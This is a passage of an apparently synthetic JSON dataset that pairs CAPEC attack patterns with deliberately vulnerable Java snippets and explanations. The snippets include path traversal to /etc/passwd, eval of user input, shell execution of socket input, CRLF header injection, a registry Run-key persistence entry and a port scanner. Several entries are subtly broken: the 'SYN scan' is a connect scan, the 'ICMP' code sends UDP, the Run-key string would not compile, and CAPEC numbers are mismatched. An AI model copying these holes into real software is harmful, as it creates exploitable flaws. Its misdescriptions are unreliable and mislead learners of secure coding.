        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"../../etc/passwd\";\n        String canonicalPath = canonicalize(userInput);\n        if (isValidPath(userInput)) { // Incorrect Behavior Order: Validate Before Canonicalize\n            System.out.println(\"Valid path: \" + canonicalPath);\n        } else {\n            System.out.println(\"Invalid path\");\n        }\n    }\n\n    public static String canonicalize(String path) {\n        try {\n            return new java.io.File(path).getCanonicalPath();\n        } catch (java.io.IOException e) {\n            return null;\n        }\n    }\n\n    public static boolean isValidPath(String path) {\n        // Simple validation logic\n        return !path.contains(\"..\");\n    }\n\n    public void evalInjection(String userInput) {\n        try {\n            // Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n            javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();\n            javax.script.ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            engine.eval(userInput); // Potentially dangerous\n        } catch (javax.script.ScriptException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void modifyAttributes(Map<String, Object> attributes) {\n        // Improperly Controlled Modification of Dynamically-Determined Object Attributes\n        Map<String, Object> objectAttributes = new HashMap<>();\n        for (Map.Entry<String, Object> entry : attributes.entrySet()) {\n            objectAttributes.put(entry.getKey(), entry.getValue()); // No control over which attributes are modified\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Manipulate Canonicalization' and its associated CWEs. The main idea is to show how improper handling of canonicalization and validation can lead to security issues.\n\n1. **Incorrect Behavior Order: Validate Before Canonicalize (CWE-180)**: The code validates the user input before canonicalizing it, which can lead to bypassing the validation if the canonicalized path is different from the original input.\n\n2. **Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') (CWE-95)**: The `evalInjection` method takes user input and evaluates it as JavaScript code without proper neutralization, which can lead to code injection attacks.\n\n3. **Improperly Controlled Modification of Dynamically-Determined Object Attributes (CWE-915)**: The `modifyAttributes` method allows modification of object attributes based on user input without proper control, which can lead to unauthorized changes to the object's state.\n\nThese examples illustrate common pitfalls in handling user input and the importance of proper validation, canonicalization, and control over dynamic code execution and attribute modification."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import java.io.UnsupportedEncodingException;\nimport java.net.URLDecoder;\nimport java.util.regex.Pattern;\n\npublic class VulnerableEncodingExample {\n    public static void main(String[] args) {\n        String userInput = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded input representing \"../../etc/passwd\"\n        try {\n            // Validate input before decoding (CWE-180)\n            if (isValidInput(userInput)) {\n                String decodedInput = URLDecoder.decode(userInput, \"UTF-8\");\n                // Use the decoded input in a file path (CWE-73)\n                String filePath = \"/var/www/html/\" + decodedInput;\n                System.out.println(\"Accessing file: \" + filePath);\n            } else {\n                System.out.println(\"Invalid input detected.\");\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // Simple validation to check for dangerous patterns (CWE-20)\n        Pattern pattern = Pattern.compile(\"[<>%]\", Pattern.CASE_INSENSITIVE);\n        return !pattern.matcher(input).find();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Leverage Alternate Encoding'. The code attempts to validate user input before decoding it, which is a common mistake (CWE-180). The user input is URL-encoded and represents a path traversal attack (e.g., '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd' decodes to '../../etc/passwd'). The validation function checks for dangerous patterns but does so on the encoded input, making it ineffective. After validation, the input is decoded and used to construct a file path, which can lead to a security issue (CWE-73). This example highlights the importance of decoding input before validation to ensure that harmful content is correctly identified and handled."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class AuditLogManipulation {\n    private static final Logger logger = Logger.getLogger(AuditLogManipulation.class.getName());\n    private static final String LOG_FILE = \"audit.log\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-117: Improper Output Neutralization for Logs\n            String userInput = \"User input with special characters: \\n \\t \\r\";\n            logger.log(Level.INFO, \"User action: {0}\", userInput);\n\n            // CWE-532: Insertion of Sensitive Information into Log File\n            String sensitiveInfo = \"User password: secret123\";\n            logger.log(Level.WARNING, \"Sensitive info: {0}\", sensitiveInfo);\n\n            // CWE-779: Logging of Excessive Data\n            for (int i = 0; i < 1000; i++) {\n                logger.log(Level.INFO, \"Log entry {0}\", i);\n            }\n\n            // CWE-778: Insufficient Logging\n            // Important security event not logged\n            // logger.log(Level.SEVERE, \"Security event: Unauthorized access attempt\");\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            writeLogToFile(\"System info: OS version, memory usage\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to write to log file\", e);\n        }\n    }\n\n    private static void writeLogToFile(String logEntry) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(logEntry + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to audit log manipulation. It includes improper output neutralization (CWE-117) by logging user input with special characters, insertion of sensitive information into the log file (CWE-532) by logging a password, logging excessive data (CWE-779) by creating numerous log entries, insufficient logging (CWE-778) by omitting a critical security event, and exposure of sensitive system information (CWE-497) by writing system details to a log file without proper access controls. These vulnerabilities can be exploited by an attacker to manipulate, delete, or forge log entries, misleading audits or covering tracks of an attack."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        Preferences prefs = Preferences.userRoot().node(\"/com/example/app\");\n        \n        // CWE-314: Cleartext Storage in the Registry\n        String sensitiveData = \"password123\";\n        prefs.put(\"sensitiveKey\", sensitiveData); // Storing sensitive data in cleartext\n        \n        // CWE-270: Privilege Context Switching Error\n        try {\n            System.setProperty(\"java.security.policy\", \"path/to/policy/file\");\n            System.setSecurityManager(new SecurityManager());\n            // Perform privileged action\n        } finally {\n            System.setSecurityManager(null); // Improperly managing privilege context\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of registry manipulation, embodying the main idea of CAPEC-203: Manipulate Application Registry Values. The code stores sensitive information in cleartext in the registry (CWE-314), which can be easily accessed by unauthorized users. Additionally, it shows improper management of privilege context switching (CWE-270) by setting a security manager and then removing it, potentially leaving the application in an insecure state. These vulnerabilities highlight the risks associated with improper registry manipulation and privilege management."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryRunKeyModifier {\n    public static void main(String[] args) {\n        try {\n            // Obtain the user preferences node for the package\n            Preferences userPrefs = Preferences.userRoot().node(\"com.example\");\n\n            // Add a new entry to the run key\n            userPrefs.put(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyMaliciousApp\", \"C:\\path\\to\\malicious.exe\");\n\n            // Store sensitive information in cleartext (CWE-314)\n            userPrefs.put(\"SensitiveInfo\", \"password123\");\n\n            System.out.println(\"Registry run key modified successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might modify the Windows registry run keys to ensure a malicious application runs every time a user logs in. The code uses the Preferences API to add a new entry to the 'Run' key in the Windows registry, pointing to a malicious executable. Additionally, it stores sensitive information in cleartext within the registry, illustrating CWE-314. This code represents the CAPEC scenario where an attacker ensures persistence on a target system by leveraging registry modifications and highlights the associated weaknesses."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class SchemaPoisoningExample {\n    private static final String SCHEMA_FILE = \"schema.properties\";\n\n    public static void main(String[] args) {\n        try {\n            // Load schema from file\n            Properties schema = new Properties();\n            schema.load(new FileInputStream(SCHEMA_FILE));\n\n            // Simulate external control of schema\n            String newSchemaValue = args[0]; // External input\n            schema.setProperty(\"schemaKey\", newSchemaValue);\n\n            // Save the modified schema back to file\n            schema.store(new FileOutputStream(SCHEMA_FILE), null);\n\n            System.out.println(\"Schema updated successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of schema poisoning. The code loads a schema from a properties file, allows an external input (via command-line arguments) to modify the schema, and then saves the modified schema back to the file. This represents the CAPEC concept of 'Schema Poisoning' where an adversary can corrupt or modify the schema content. The code also touches on related CWEs: 'External Control of System or Configuration Setting' (CWE-15) by allowing external input to control the schema, and 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' (CWE-497) by potentially exposing schema details to unauthorized users. This example is vulnerable because it does not validate or sanitize the external input, leading to potential security risks."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            String message = \"AUTH user:password\";\n            out.println(message);\n\n            // Read the server's response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a communication protocol. The code establishes a socket connection to a server at 'example.com' on port 8080 and sends an authentication message 'AUTH user:password'. The server's response is then read and printed. This code is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Improper Verification of Source of a Communication Channel (CWE-940)**: The code does not verify the source of the incoming response, making it susceptible to man-in-the-middle attacks.\n2. **Reflection Attack in an Authentication Protocol (CWE-301)**: The simple authentication message can be reflected back by an attacker to impersonate a trusted user.\n3. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: There is no mechanism to ensure the integrity of the message during transmission, allowing for potential tampering.\n4. **Authentication Bypass by Capture-replay (CWE-294)**: The authentication message can be captured and replayed by an attacker to bypass authentication.\n5. **Incorrectly Specified Destination in a Communication Channel (CWE-941)**: The code assumes 'example.com' is the correct destination without any verification, which could be incorrect or maliciously altered."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String headerValue = \"User-Agent: \" + userInput;\n\n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n        response.setHeader(\"Custom-Header\", headerValue);\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests\n        PrintWriter out = response.getWriter();\n        out.println(\"HTTP/1.1 200 OK\");\n        out.println(\"Content-Type: text/plain\");\n        out.println();\n        out.println(\"Hello, World!\");\n        out.println();\n        out.println(\"HTTP/1.1 200 OK\"); // Injected malicious response\n        out.println(\"Content-Type: text/plain\");\n        out.println();\n        out.println(\"Injected Response\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Response Smuggling. The `doPost` method takes user input from an HTTP request and uses it to set a custom header without properly neutralizing CRLF sequences (CWE-113). This can allow an attacker to inject additional HTTP headers or responses. Additionally, the code manually constructs an HTTP response, which can lead to inconsistent interpretation of HTTP requests (CWE-444). The injected malicious response (`HTTP/1.1 200 OK`) demonstrates how an attacker could manipulate the response to include unauthorized content, embodying the main idea of HTTP Response Smuggling."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VerbTamperingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Simulate access control based on HTTP verb\n        if (!\"GET\".equals(request.getMethod())) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Forbidden\");\n            return;\n        }\n        // Process the request\n        response.getWriter().write(\"Sensitive data accessed via GET\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Simulate access control based on HTTP verb\n        if (!\"POST\".equals(request.getMethod())) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Forbidden\");\n            return;\n        }\n        // Process the request\n        response.getWriter().write(\"Sensitive data accessed via POST\");\n    }\n\n    @Override\n    protected void doPut(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Simulate access control based on HTTP verb\n        if (!\"PUT\".equals(request.getMethod())) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Forbidden\");\n            return;\n        }\n        // Process the request\n        response.getWriter().write(\"Sensitive data accessed via PUT\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Verb Tampering. The servlet defines separate methods for handling GET, POST, and PUT requests. Each method checks if the HTTP verb matches the expected one and returns a 'Forbidden' error if it does not. However, this simplistic access control mechanism can be bypassed if an attacker uses a different HTTP verb or a random string, as the servlet does not enforce strict access control policies. This example also highlights CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the HTTP verb for access control, and CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the HTTP verb is immutable and trustworthy."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSRebindingExample {\n    public static void main(String[] args) throws Exception {\n        String maliciousDomain = \"malicious.example.com\";\n        String internalIP = \"192.168.1.100\";\n\n        // Initial DNS resolution\n        InetAddress initialAddress = InetAddress.getByName(maliciousDomain);\n        System.out.println(\"Initial IP: \" + initialAddress.getHostAddress());\n\n        // Simulate DNS rebinding by changing the IP address\n        // In a real attack, this would be done by the attacker's DNS server\n        // Here we simulate it by directly setting the internal IP\n        InetAddress rebindingAddress = InetAddress.getByName(internalIP);\n        System.out.println(\"Rebound IP: \" + rebindingAddress.getHostAddress());\n\n        // Attempt to connect to the internal IP\n        Socket socket = new Socket(rebindingAddress, 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Send HTTP request to the internal server\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: \" + maliciousDomain);\n        out.println(\"Connection: close\");\n        out.println();\n\n        // Read and print the response\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n\n        // Close resources\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a DNS rebinding attack. Initially, the code resolves a domain name controlled by an attacker (malicious.example.com) to an IP address. The attacker then changes the DNS resolution to an internal IP address (192.168.1.100) within the target organization. The code simulates this by directly setting the internal IP address. The client then attempts to connect to the internal IP address, sending an HTTP request and printing the response. This represents the main idea of CAPEC-111 (DNS Rebinding) and highlights the vulnerability CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action). The code also touches on CWE-1327 (Binding to an Unrestricted IP Address) by demonstrating how an attacker can exploit DNS rebinding to access internal resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedMessage = in.readLine();\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            System.out.println(\"Received: \" + receivedMessage);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            if (receivedMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // CWE-707: Improper Neutralization\n            String command = in.readLine();\n            Runtime.getRuntime().exec(command); // Potentially dangerous command execution\n\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable inter-component protocol communication scenario. The server listens on port 8080 and accepts incoming connections. It reads messages from the client in cleartext (CWE-319), which can be intercepted by unauthorized actors. The server does not verify the integrity of the received messages (CWE-924), allowing potential tampering. Additionally, the server executes commands received from the client without proper neutralization (CWE-707), leading to potential command injection attacks. This code embodies the main idea of CAPEC-272 by showcasing how improper handling of inter-component protocols can lead to various security vulnerabilities."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<user><id>123</id><role>admin</role></user>\";\n        parseXML(xmlData);\n    }\n\n    public static void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n\n            String userId = document.getElementsByTagName(\"id\").item(0).getTextContent();\n            String userRole = document.getElementsByTagName(\"role\").item(0).getTextContent();\n\n            // Improper Neutralization (CWE-707)\n            System.out.println(\"User ID: \" + userId);\n            System.out.println(\"User Role: \" + userRole);\n\n            // Authentication Bypass by Assumed-Immutable Data (CWE-302)\n            if (userRole.equals(\"admin\")) {\n                System.out.println(\"Access granted to admin functionalities.\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that embodies the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code reads and parses an XML string containing user information. It does not properly neutralize the input (CWE-707), making it susceptible to XML injection attacks. Additionally, it assumes that the 'role' field is immutable and trustworthy (CWE-302), which can be exploited to bypass authentication and gain unauthorized access to admin functionalities. This example highlights the risks of improper handling and validation of structured data in data interchange protocols."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableWebService extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String action = request.getParameter(\"action\");\n        if (action != null) {\n            switch (action) {\n                case \"view\":\n                    viewData(response);\n                    break;\n                case \"delete\":\n                    deleteData(response);\n                    break;\n                default:\n                    response.getWriter().write(\"Invalid action\");\n            }\n        } else {\n            response.getWriter().write(\"No action specified\");\n        }\n    }\n\n    private void viewData(HttpServletResponse response) throws IOException {\n        // Simulate viewing data\n        response.getWriter().write(\"Viewing data\");\n    }\n\n    private void deleteData(HttpServletResponse response) throws IOException {\n        // Simulate deleting data\n        response.getWriter().write(\"Data deleted\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable web service that can be manipulated through the 'action' parameter. The 'action' parameter is used to determine which function to call ('view' or 'delete'). An attacker can manipulate this parameter to perform unauthorized actions, such as deleting data. This embodies the main idea of CAPEC-252 (Web Services Protocol Manipulation) by allowing an adversary to manipulate call parameters to include unexpected values or call restricted functions. The code also reflects CWE-707 (Improper Neutralization) as it does not validate the 'action' parameter properly, CWE-602 (Client-Side Enforcement of Server-Side Security) as it relies on the client to specify the action, and CWE-573 (Improper Following of Specification by Caller) as it does not follow secure coding practices for handling user input."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class SOAPManipulationExample {\n    public static void main(String[] args) throws Exception {\n        String soapMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:login>\"\n                + \"<username>admin</username>\"\n                + \"<password>password</password>\"\n                + \"</web:login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        // Simulate an attacker manipulating the SOAP message\n        String manipulatedMessage = soapMessage.replace(\"<username>admin</username>\", \"<username>attacker</username>\");\n\n        // Parse the manipulated SOAP message\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage(null, new ByteArrayInputStream(manipulatedMessage.getBytes()));\n\n        // Process the SOAP message (vulnerable to manipulation)\n        SOAPBody body = message.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) body.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        // Print the extracted username and password\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP manipulation vulnerability. The code constructs a SOAP message for a login request, then simulates an attacker manipulating the SOAP message by changing the username. The manipulated message is then parsed and processed without any validation, leading to the extraction of the manipulated username and password. This example highlights the risk of improper neutralization (CWE-707) and client-side enforcement of server-side security (CWE-602), as the server blindly trusts the incoming SOAP message without proper validation or authentication checks."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\nimport java.nio.charset.StandardCharsets;\n\npublic class SOAPParameterTampering {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<web:username>admin</web:username>\"\n                + \"<web:password>password123</web:password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null,\n                new ByteArrayInputStream(maliciousSOAPMessage.getBytes(StandardCharsets.UTF_8)));\n\n        // Simulate sending the SOAP message to the server\n        // In a real scenario, this would be sent over HTTP to the web service endpoint\n        System.out.println(\"Sending SOAP Message:\");\n        message.writeTo(System.out);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP parameter tampering attack. The code constructs a malicious SOAP message that attempts to log in with hardcoded credentials ('admin' and 'password123'). The SOAP message is created using the `MessageFactory` and `SOAPMessage` classes from the `javax.xml.soap` package. The message is then printed to the console, simulating the process of sending it to a web service endpoint. This example highlights the vulnerability of SOAP-based web services to parameter tampering attacks, where an attacker can manipulate the parameters in the SOAP message to gain unauthorized access or perform other malicious actions. The code also touches on related CWEs, such as the exposure of sensitive information in WSDL files (CWE-651) and authentication bypass issues (CWE-294)."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class PingTest {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingTest <IP address>\");\n            return;\n        }\n\n        String ipAddress = args[0];\n        try {\n            InetAddress inet = InetAddress.getByName(ipAddress);\n            System.out.println(\"Pinging \" + ipAddress + \"...\");\n            boolean status = inet.isReachable(5000); // 5 seconds timeout\n\n            if (status) {\n                System.out.println(ipAddress + \" is reachable.\");\n            } else {\n                System.out.println(ipAddress + \" is not reachable.\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + ipAddress);\n        } catch (IOException e) {\n            System.out.println(\"Error in reaching the host: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple implementation of an ICMP Echo Request (Ping) to check if a target system is responsive. The program takes an IP address as a command-line argument and attempts to ping it using the `isReachable` method from the `InetAddress` class. If the target system responds within the specified timeout (5 seconds), it prints that the system is reachable; otherwise, it prints that the system is not reachable.\n\nThe code embodies the main idea of the CAPEC by performing a ping operation to determine if a target system is alive. It also touches on related CWEs:\n- CWE-200: The code could expose sensitive information (e.g., network topology) to unauthorized actors if not properly secured.\n- CWE-319: The ping request and response are transmitted in cleartext, which could be sniffed by unauthorized actors.\n- CWE-1320: The code does not handle outbound error messages securely, potentially allowing untrusted agents to disable alerts.\n\nThis example highlights the importance of securing network diagnostic tools to prevent information leakage and unauthorized access."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\"; // Target IP address\n        int startPort = 1;\n        int endPort = 1024;\n\n        for (int port = startPort; port <= endPort; port++) {\n            try {\n                Socket socket = new Socket(target, port);\n                System.out.println(\"Port \" + port + \" is open.\");\n                socket.close();\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + target);\n                break;\n            } catch (IOException e) {\n                // Port is closed or filtered\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic TCP SYN scan on a target IP address (192.168.1.1) over a range of ports (1 to 1024). The code attempts to establish a socket connection to each port in the specified range. If the connection is successful, it prints that the port is open. If an IOException occurs, it implies that the port is closed or filtered. This code embodies the main idea of the CAPEC 'TCP SYN Scan' by demonstrating how an adversary might scan for open ports on a target system. The code also indirectly touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by potentially revealing open ports and services, and 'Excessive Attack Surface' (CWE-1125) by scanning a wide range of ports."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class PingReplayAttack {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingReplayAttack <target IP>\");\n            return;\n        }\n\n        String targetIP = args[0];\n        byte[] icmpPacket = createICMPPacket();\n\n        // Send ICMP Echo Request\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(icmpPacket, icmpPacket.length, InetAddress.getByName(targetIP), 0);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request sent to \" + targetIP);\n\n        // Capture and replay the ICMP Echo Request\n        socket.receive(packet);\n        socket.send(packet);\n        System.out.println(\"ICMP Echo Request replayed to \" + targetIP);\n\n        socket.close();\n    }\n\n    private static byte[] createICMPPacket() {\n        byte[] packet = new byte[28];\n        packet[0] = 8; // Type: Echo (ping) request\n        packet[1] = 0; // Code: 0\n        // Checksum, Identifier, Sequence Number, and Data can be set here\n        return packet;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an ICMP Echo Request (ping) replay attack. The program sends an ICMP Echo Request to a specified target IP address and then captures and replays the same request. This embodies the concept of a capture-replay attack (CWE-294), where an attacker can sniff network traffic and replay it to achieve the same effect as the original message. The code also touches on the deprecated CAPEC-285, which involves ICMP Echo Request Ping attacks. The code is vulnerable because it does not implement any security measures to prevent the replay of captured packets."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    private static Map<String, String> protectedData = new HashMap<>();\n    private static Map<String, String> unprotectedData = new HashMap<>();\n\n    static {\n        // Initialize protected data\n        protectedData.put(\"adminPassword\", \"superSecret\");\n        // Initialize unprotected data\n        unprotectedData.put(\"publicInfo\", \"This is public\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate an overlap in address map\n        String key = \"adminPassword\";\n        if (unprotectedData.containsKey(key)) {\n            System.out.println(\"Accessing unprotected data: \" + unprotectedData.get(key));\n        } else if (protectedData.containsKey(key)) {\n            System.out.println(\"Accessing protected data: \" + protectedData.get(key));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where protected and unprotected data regions overlap, allowing an attacker to potentially access protected data through the unprotected data map. The `protectedData` map contains sensitive information, while the `unprotectedData` map contains non-sensitive information. The code checks for a key in the unprotected data map first, which could lead to unauthorized access to protected data if the key overlaps. This represents the idea of 'Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges' (CWE-1316) and indirectly touches on the concept of 'Creation of Emergent Resource' (CWE-1229) by creating an unintended access path."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
